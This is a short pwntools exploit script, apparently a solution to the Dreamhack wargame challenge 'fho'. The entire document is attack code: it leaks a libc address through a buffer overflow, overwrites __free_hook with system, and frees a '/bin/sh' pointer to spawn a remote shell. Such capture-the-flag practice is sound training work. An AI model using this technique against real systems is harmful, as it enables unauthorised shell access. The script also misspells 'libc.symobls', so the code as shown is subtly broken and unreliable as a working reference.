from pwn import *

# Must be updated
p = remote("host3.dreamhack.games", 9926)
e = ELF("./fho")
libc = ELF("./libc-2.27.so")

payload = b'\x90' * 0x40
payload += b'\x90' * 0x8
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)
libc_start_main = u64(p.recvn(6)+b'\x00'*2)

libc_base = libc_start_main - (libc.symbols['__libc_start_main'] + 231)          # remote에서는 offset이 231
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symobls['__free_hook']
binsh = libc_base + next(libc.search(b'/bin/sh'))

p.sendlineafter(b'To write: ', str(free_hook))
p.sendlineafter(b'With: ', str(system))
p.sendlineafter(b'To free: ', str(binsh))

p.interactive()
